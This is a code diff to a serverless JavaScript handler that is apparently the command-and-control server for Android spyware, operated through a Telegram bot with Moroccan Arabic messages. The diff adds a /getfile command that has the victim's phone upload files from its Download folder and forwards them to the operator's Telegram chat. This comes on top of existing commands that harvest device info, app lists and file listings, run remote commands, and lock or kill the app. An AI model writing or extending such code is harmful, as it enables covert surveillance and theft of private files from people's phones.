@@ -30,7 +30,6 @@ export default async function handler(req, res) {
 
   const type = req.query.type;
   const deviceId = req.query.device_id;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
     if (TELEGRAM_TOKEN && chatId) {
@@ -81,7 +80,6 @@ export default async function handler(req, res) {
           return res.status(200).send('"killapp:1"');
         }
       }
-      
       const cmd = remoteCommand;
       remoteCommand = ""; 
       return res.status(200).send(`"${cmd}"`);
@@ -105,25 +103,34 @@ export default async function handler(req, res) {
             if (recentLogs.length > 50) recentLogs.pop();
             await kvCmd('INCR', 'total_attempts');
             await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
-            
-            if (cleanBody.includes('success')) {
-              const match = cleanBody.match(/Device:\s*([a-zA-Z0-9]+)/);
-              const devId = match ? match[1] : null;
-              const isSingleUse = await kvCmd('GET', 'is_single_use');
+          }
+
+          // === استقبال الملفات وإرسالها لتيليجرام ===
+          if (type === 'getfile') {
+            try {
+              const parts = cleanBody.split('|');
+              const filename = parts[0];
+              const base64Data = parts[1];
               
-              if (devId && isSingleUse === '1') {
-                  activeDevice = devId;
-                  const duration = parseInt(await kvCmd('GET', 'key_duration') || "0");
-                  if (duration > 0) {
-                      keyExpiryTime = Date.now() + (duration * 60000);
-                  }
-                  await kvCmd('SET', 'app_secret_key', 'EXPIRED_KEY');
-                  await kvCmd('SET', 'is_single_use', '0');
-                  await sendToTelegram(`⏱️ *المفتاح استعمل!*\nالجهاز: \`${devId}\`\nغادي يتقفل التطبيق بعد \`${duration}\` دقيقة.`);
+              if (!base64Data) {
+                await sendToTelegram("⚠️ File is empty or could not be read.");
+              } else {
+                const buffer = Buffer.from(base64Data, 'base64');
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('document', new Blob([buffer]), filename);
+                formData.append('caption', `📁 File: ${filename}`);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
+                  method: 'POST',
+                  body: formData
+                }).catch(e => console.error(e));
               }
+            } catch (err) {
+              await sendToTelegram(`❌ Error: ${err.message}`);
             }
           }
-          
+
           if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
           if (type === 'applist') await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
           if (type === 'files') await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
@@ -154,16 +161,22 @@ export default async function handler(req, res) {
         case '/help': 
           await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
             `⚡ *الأوامر الحقيقية:*\n` +
-            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
+            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n` +
+            `/getfile <filename> - سحب ملف من مجلد Download\n\n` +
             `⏱️ *التحكم بالوقت:*\n` +
-            `/gentime <minutes> - إنشاء مفتاح بوقت محدد\n` +
-            `/settime <minutes> - تحديد وقت للمفتاح الحالي\n` +
-            `/unbanall - فك الحظر عن الجميع\n` +
-            `/unlock - فتح التطبيق\n` +
-            `/setkey 1234 - إرجاع الكود الافتراضي\n\n` +
-            `🚫 *الحظر:*\n/ban /unban /banall /banlist`); 
+            `/gentime <minutes> /settime <minutes>\n\n` +
+            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist`); 
           break;
         
+        case '/getfile':
+          if(args[1]) { 
+            remoteCommand = `getfile:${args[1]}`; 
+            await sendToTelegram(`⏳ \`[FETCH]\` *Fetching file: ${args[1]}...*`); 
+          } else {
+            await sendToTelegram("⚠️ استعمل: `/getfile README.txt`");
+          }
+          break;
+
         case '/gentime':
           if(args[1]) {
             const minutes = parseInt(args[1]);
@@ -171,10 +184,9 @@ export default async function handler(req, res) {
             await kvCmd('SET', 'app_secret_key', newKey);
             await kvCmd('SET', 'key_duration', minutes);
             await kvCmd('SET', 'is_single_use', '1');
-            activeDevice = ""; 
-            keyExpiryTime = 0;
-            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\nملاحظة: كيتقفل التطبيق أوتوماتيكياً ملي تنقضي المدة.`);
-          } else await sendToTelegram("⚠️ استعمل: `/gentime 60` (لمدة 60 دقيقة)");
+            activeDevice = ""; keyExpiryTime = 0;
+            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة`);
+          } else await sendToTelegram("⚠️ استعمل: `/gentime 60`");
           break;
           
         case '/settime':
@@ -182,8 +194,7 @@ export default async function handler(req, res) {
             const minutes = parseInt(args[1]);
             await kvCmd('SET', 'key_duration', minutes);
             await kvCmd('SET', 'is_single_use', '1');
-            keyExpiryTime = 0; 
-            activeDevice = "";
+            keyExpiryTime = 0; activeDevice = "";
             await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
           } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
           break;
@@ -203,21 +214,16 @@ export default async function handler(req, res) {
         case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
         case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "1234"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
         
-        // === أوامر الحظر (مصححة ومدموجة) ===
         case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
         case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
         case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
         case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
         
-        // هنا زدنا banlist
         case '/banlist': 
           const bannedRaw = await kvCmd('SMEMBERS', 'banned_devices');
           const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
-          if (bannedList.length > 0) {
-            await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join('\n')}\``);
-          } else {
-            await sendToTelegram("✅ *No devices are banned.*");
-          }
+          if (bannedList.length > 0) await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join('\n')}\``);
+          else await sendToTelegram("✅ *No devices are banned.*");
           break;
         
         case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
@@ -225,11 +231,8 @@ export default async function handler(req, res) {
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
         
         default:
-          if (command.startsWith('/')) {
-            await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
-          } else {
-            await sendToTelegram("❓ أمر غير معروف. كتب /help");
-          }
+          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
+          else await sendToTelegram("❓ أمر غير معروف. كتب /help");
       }
       return res.status(200).end();
     }
